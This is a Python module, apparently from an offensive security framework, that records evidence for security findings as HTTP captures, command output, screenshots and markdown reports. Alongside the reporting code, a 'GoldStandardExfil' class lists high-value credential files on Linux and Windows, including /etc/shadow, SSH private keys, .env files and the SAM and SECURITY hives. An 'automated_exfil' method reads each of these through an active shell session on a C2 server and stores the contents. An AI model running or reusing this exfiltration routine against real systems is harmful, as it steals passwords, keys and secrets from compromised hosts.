"""
Evidence Collection System
Automatically captures proof for security findings.
"""

import re
import json
import hashlib
import subprocess
from pathlib import Path
from typing import Dict, List, Optional
from dataclasses import dataclass, field, asdict
from datetime import datetime
from loguru import logger


@dataclass
class Evidence:
    """A piece of evidence for a finding."""
    id: str
    finding_type: str
    target: str
    title: str
    
    # Evidence data
    http_request: str = ""
    http_response: str = ""
    screenshot_path: str = ""
    command_output: str = ""
    poc_command: str = ""
    
    # Metadata
    timestamp: str = ""
    severity: str = "info"
    validated: bool = False
    hash_sha256: str = ""
    
    def __post_init__(self):
        if not self.timestamp:
            self.timestamp = datetime.now().isoformat()
        if not self.id:
            self.id = hashlib.md5(f"{self.target}{self.title}{self.timestamp}".encode()).hexdigest()[:12]


@dataclass
class EvidenceCollection:
    """Collection of evidence for a target."""
    target: str
    session_id: str
    created_at: str = ""
    evidence: List[Evidence] = field(default_factory=list)
    
    def __post_init__(self):
        if not self.created_at:
            self.created_at = datetime.now().isoformat()


class GoldStandardExfil:
    """Definition of high-value targets for automated exfiltration."""
    
    # Path: Description
    LINUX_TARGETS = {
        "/etc/shadow": "Linux password hashes (requires root)",
        "/etc/passwd": "User list and shell info",
        "/etc/group": "Group permissions",
        "~/.ssh/id_rsa": "Private SSH keys",
        "~/.ssh/authorized_keys": "Authorized SSH keys",
        "~/.bash_history": "Command history (creds/endpoints)",
        "/var/www/html/.env": "Web environment variables",
        "/etc/kubernetes/admin.conf": "K8s admin config",
        "/root/.ssh/id_rsa": "Root SSH keys"
    }
    
    WINDOWS_TARGETS = {
        "C:\\Windows\\System32\\config\\SAM": "SAM hive (hashes)",
        "C:\\Windows\\System32\\config\\SYSTEM": "SYSTEM hive (boot key)",
        "C:\\Windows\\System32\\config\\SECURITY": "SECURITY hive (LSA secrets)",
        "C:\\inetpub\\wwwroot\\web.config": "IIS configuration",
        "%USERPROFILE%\\.ssh\\id_rsa": "SSH keys",
        "%AppData%\\Microsoft\\Windows\\Recent": "Recent files",
        "C:\\Windows\\debug\\NetSetup.log": "Domain join info"
    }

    @staticmethod
    def get_targets(platform: str = "linux") -> Dict[str, str]:
        if "win" in platform.lower():
            return GoldStandardExfil.WINDOWS_TARGETS
        return GoldStandardExfil.LINUX_TARGETS


class EvidenceCollector:
    """
    Collects and manages evidence for security findings.
    
    Features:
    - HTTP request/response capture
    - Screenshot capture
    - PoC command recording
    - Evidence integrity hashing
    - Export to various formats
    """
    
    def __init__(self, evidence_dir: str = "./evidence"):
        self.evidence_dir = Path(evidence_dir)
        self.evidence_dir.mkdir(parents=True, exist_ok=True)
        self.collections: Dict[str, EvidenceCollection] = {}
        self._current_target: str = ""
    
    def set_target(self, target: str):
        """Set current target for evidence collection."""
        self._current_target = target
        if target not in self.collections:
            session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
            self.collections[target] = EvidenceCollection(
                target=target,
                session_id=session_id
            )
            self._ensure_target_dir(target)
    
    def _ensure_target_dir(self, target: str) -> Path:
        """Ensure target evidence directory exists."""
        # Sanitize target for filesystem
        safe_target = re.sub(r'[^\w\-.]', '_', target)
        target_dir = self.evidence_dir / safe_target
        target_dir.mkdir(parents=True, exist_ok=True)
        return target_dir
    
    def _calculate_hash(self, *data) -> str:
        """Calculate SHA256 hash of combined data."""
        combined = "".join(str(d) for d in data)
        return hashlib.sha256(combined.encode()).hexdigest()
    
    def capture_http(self, finding_type: str, title: str, 
                     request: str, response: str,
                     target: str = "", severity: str = "info",
                     poc_command: str = "") -> Evidence:
        """
        Capture HTTP request/response as evidence.
        
        Args:
            finding_type: Type of finding (sqli, xss, etc.)
            title: Finding title
            request: Raw HTTP request
            response: Raw HTTP response
            target: Target (uses current if not specified)
            severity: Severity level
            poc_command: PoC reproduction command
        
        Returns:
            Evidence object
        """
        target = target or self._current_target
        if not target:
            raise ValueError("No target specified")
        
        self.set_target(target)
        
        evidence = Evidence(
            id="",  # Will be generated
            finding_type=finding_type,
            target=target,
            title=title,
            http_request=request,
            http_response=response[:50000],  # Limit response size
            poc_command=poc_command,
            severity=severity,
            hash_sha256=self._calculate_hash(request, response)
        )
        
        self.collections[target].evidence.append(evidence)
        self._save_evidence(target, evidence)
        
        logger.info(f"📸 Evidence captured: {title}")
        return evidence
    
    def capture_command_output(self, finding_type: str, title: str,
                               command: str, output: str,
                               target: str = "", severity: str = "info") -> Evidence:
        """
        Capture command output as evidence.
        
        Args:
            finding_type: Type of finding
            title: Finding title
            command: Command that was run
            output: Command output
            target: Target
            severity: Severity level
        
        Returns:
            Evidence object
        """
        target = target or self._current_target
        if not target:
            raise ValueError("No target specified")
        
        self.set_target(target)
        
        evidence = Evidence(
            id="",
            finding_type=finding_type,
            target=target,
            title=title,
            command_output=output[:100000],  # Limit size
            poc_command=command,
            severity=severity,
            hash_sha256=self._calculate_hash(command, output)
        )
        
        self.collections[target].evidence.append(evidence)
        self._save_evidence(target, evidence)
        
        logger.info(f"📸 Evidence captured: {title}")
        return evidence
    
    def capture_screenshot(self, url: str, title: str,
                          target: str = "", severity: str = "info") -> Optional[Evidence]:
        """
        Capture a screenshot of a URL.
        
        Returns:
            Evidence object or None if failed
        """
        target = target or self._current_target
        if not target:
            raise ValueError("No target specified")
        
        self.set_target(target)
        target_dir = self._ensure_target_dir(target)
        
        # Generate screenshot filename
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_title = re.sub(r'[^\w\-]', '_', title)[:30]
        screenshot_path = target_dir / f"screenshot_{safe_title}_{timestamp}.png"
        
        # Try to capture screenshot using various methods
        success = False
        
        # Method 1: Playwright
        try:
            from playwright.sync_api import sync_playwright
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True)
                page = browser.new_page()
                page.goto(url, timeout=30000)
                page.screenshot(path=str(screenshot_path))
                browser.close()
                success = True
        except Exception as e:
            logger.debug(f"Playwright screenshot failed: {e}")
        
        # Method 2: Selenium
        if not success:
            try:
                from selenium import webdriver
                from selenium.webdriver.chrome.options import Options
                options = Options()
                options.add_argument('--headless')
                options.add_argument('--no-sandbox')
                driver = webdriver.Chrome(options=options)
                driver.get(url)
                driver.save_screenshot(str(screenshot_path))
                driver.quit()
                success = True
            except Exception as e:
                logger.debug(f"Selenium screenshot failed: {e}")
        
        # Method 3: cutycapt (Linux)
        if not success:
            try:
                result = subprocess.run(
                    ["cutycapt", f"--url={url}", f"--out={screenshot_path}"],
                    capture_output=True, timeout=30
                )
                if result.returncode == 0:
                    success = True
            except Exception as e:
                logger.debug(f"cutycapt screenshot failed: {e}")
        
        if success and screenshot_path.exists():
            evidence = Evidence(
                id="",
                finding_type="screenshot",
                target=target,
                title=title,
                screenshot_path=str(screenshot_path),
                severity=severity,
                hash_sha256=self._calculate_hash(url, screenshot_path.read_bytes().hex()[:100])
            )
            
            self.collections[target].evidence.append(evidence)
            self._save_evidence(target, evidence)
            
            logger.info(f"📸 Screenshot captured: {title}")
            return evidence
        
        logger.warning(f"Failed to capture screenshot: {title}")
        return None
    
    def auto_capture(self, finding_type: str, title: str, 
                     severity: str, data: dict,
                     target: str = "") -> Evidence:
        """
        Automatically capture evidence based on available data.
        
        Args:
            finding_type: Type of finding
            title: Finding title
            severity: Severity level
            data: Dict with any of: request, response, command, output, url
            target: Target
        
        Returns:
            Evidence object
        """
        target = target or self._current_target
        
        if "request" in data and "response" in data:
            return self.capture_http(
                finding_type=finding_type,
                title=title,
                request=data.get("request", ""),
                response=data.get("response", ""),
                target=target,
                severity=severity,
                poc_command=data.get("poc_command", "")
            )
        elif "command" in data or "output" in data:
            return self.capture_command_output(
                finding_type=finding_type,
                title=title,
                command=data.get("command", ""),
                output=data.get("output", ""),
                target=target,
                severity=severity
            )
        else:
            # Generic evidence
            self.set_target(target)
            evidence = Evidence(
                id="",
                finding_type=finding_type,
                target=target,
                title=title,
                command_output=json.dumps(data, indent=2),
                severity=severity,
                hash_sha256=self._calculate_hash(json.dumps(data))
            )
            self.collections[target].evidence.append(evidence)
            self._save_evidence(target, evidence)

            # --- PHASE 9: AUTO-SCREENSHOT ---
            # If a URL is present in data, attempt a screenshot automatically
            if "url" in data and finding_type != "screenshot":
                self.capture_screenshot(data["url"], f"Auto-capture: {title}", target, severity)

            return evidence

    def automated_exfil(self, session_id: str, platform: str = "linux", target: str = "") -> List[Evidence]:
        """
        [PHASE 9] Automated 'Gold Standard' sensitive file exfiltration via an active shell.
        
        Args:
            session_id: Active shell session ID
            platform: 'linux' or 'windows'
            target: Target identifier
            
        Returns:
            List of successfully exfiltrated Evidence objects
        """
        from src.tools.c2_server import execute_in_shell
        
        target = target or self._current_target
        if not target:
            return []
        
        self.set_target(target)
        targets = GoldStandardExfil.get_targets(platform)
        collected = []
        
        logger.info(f"🚀 Starting Gold Standard Exfil for {target} ({platform})")
        
        for path, desc in targets.items():
            # Attempt to read file via shell
            cmd = f"cat {path}" if "win" not in platform.lower() else f"type {path}"
            result = execute_in_shell(session_id, cmd, timeout=5)
            
            # Simple heuristic for success (not 'Permission denied', 'No such file', etc.)
            output = ""
            if "Output:" in result:
                # Extract actual output from C2 response format
                parts = result.split("```")
                if len(parts) >= 2:
                    output = parts[1].strip()
            
            # Filter out error messages
            if output and not any(err in output.lower() for err in ["denied", "not found", "cannot find", "failed"]):
                evidence = self.capture_command_output(
                    finding_type="exfiltration",
                    title=f"Exfil: {desc} ({path})",
                    command=cmd,
                    output=output,
                    target=target,
                    severity="high" if "shadow" in path or "SAM" in path else "medium"
                )
                collected.append(evidence)
                logger.success(f"🔓 Successfully exfiltrated: {path}")
        
        return collected
    
    def _save_evidence(self, target: str, evidence: Evidence):
        """Save evidence to disk."""
        target_dir = self._ensure_target_dir(target)
        
        # Save individual evidence file
        evidence_file = target_dir / f"evidence_{evidence.id}.json"
        with open(evidence_file, 'w') as f:
            json.dump(asdict(evidence), f, indent=2)
        
        # Update collection index
        index_file = target_dir / "evidence_index.json"
        try:
            if index_file.exists():
                with open(index_file) as f:
                    index = json.load(f)
            else:
                index = {"target": target, "evidence_ids": []}
            
            if evidence.id not in index["evidence_ids"]:
                index["evidence_ids"].append(evidence.id)
            
            with open(index_file, 'w') as f:
                json.dump(index, f, indent=2)
        except Exception as e:
            logger.error(f"Failed to update evidence index: {e}")
    
    def get_evidence(self, target: str = "") -> List[Evidence]:
        """Get all evidence for a target."""
        target = target or self._current_target
        if target in self.collections:
            return self.collections[target].evidence
        return []
    
    def export_markdown(self, target: str = "") -> str:
        """Export evidence as markdown."""
        target = target or self._current_target
        evidence_list = self.get_evidence(target)
        
        if not evidence_list:
            return "No evidence collected."
        
        lines = [
            f"# Evidence Report: {target}",
            "",
            f"**Generated:** {datetime.now().isoformat()}",
            f"**Total Evidence:** {len(evidence_list)}",
            "",
            "---",
            ""
        ]
        
        for i, ev in enumerate(evidence_list, 1):
            severity_badges = {
                "critical": "🔴 CRITICAL",
                "high": "🟠 HIGH",
                "medium": "🟡 MEDIUM",
                "low": "🔵 LOW",
                "info": "⚪ INFO"
            }
            badge = severity_badges.get(ev.severity, ev.severity.upper())
            
            lines.extend([
                f"## {i}. {ev.title}",
                "",
                f"- **Severity:** {badge}",
                f"- **Type:** {ev.finding_type}",
                f"- **Timestamp:** {ev.timestamp}",
                f"- **Hash:** `{ev.hash_sha256[:16]}...`",
                ""
            ])
            
            if ev.poc_command:
                lines.extend([
                    "### PoC Command",
                    "```bash",
                    ev.poc_command,
                    "```",
                    ""
                ])
            
            if ev.http_request:
                lines.extend([
                    "### HTTP Request",
                    "```http",
                    ev.http_request[:2000],
                    "```",
                    ""
                ])
            
            if ev.http_response:
                lines.extend([
                    "### HTTP Response",
                    "```http",
                    ev.http_response[:2000],
                    "```",
                    ""
                ])
            
            if ev.command_output and not ev.http_request:
                lines.extend([
                    "### Output",
                    "```",
                    ev.command_output[:2000],
                    "```",
                    ""
                ])
            
            if ev.screenshot_path:
                lines.extend([
                    "### Screenshot",
                    f"![Screenshot]({ev.screenshot_path})",
                    ""
                ])
            
            lines.extend(["---", ""])
        
        return "\n".join(lines)
    
    def get_status(self) -> str:
        """Get evidence collection status."""
        total = sum(len(c.evidence) for c in self.collections.values())
        
        lines = [
            "╔══════════════════════════════════════════════════════════════",
            "║ 📸 EVIDENCE COLLECTION",
            "╠══════════════════════════════════════════════════════════════",
            f"║ Total Evidence: {total}",
            "╠══════════════════════════════════════════════════════════════"
        ]
        
        for target, collection in self.collections.items():
            lines.append(f"║ 🎯 {target}: {len(collection.evidence)} items")
            
            # Count by severity
            severity_counts = {}
            for ev in collection.evidence:
                severity_counts[ev.severity] = severity_counts.get(ev.severity, 0) + 1
            
            if severity_counts:
                counts_str = ", ".join(f"{k}: {v}" for k, v in severity_counts.items())
                lines.append(f"║    └── {counts_str}")
        
        lines.append("╚══════════════════════════════════════════════════════════════")
        
        return "\n".join(lines)


# Global instance
_evidence_collector: Optional[EvidenceCollector] = None


def get_evidence_collector() -> EvidenceCollector:
    """Get or create the global evidence collector."""
    global _evidence_collector
    if _evidence_collector is None:
        _evidence_collector = EvidenceCollector()
    return _evidence_collector


def capture_evidence(finding_type: str, title: str, severity: str,
                     target: str = "", **data) -> Evidence:
    """Quick function to capture evidence."""
    collector = get_evidence_collector()
    return collector.auto_capture(
        finding_type=finding_type,
        title=title,
        severity=severity,
        data=data,
        target=target
    )
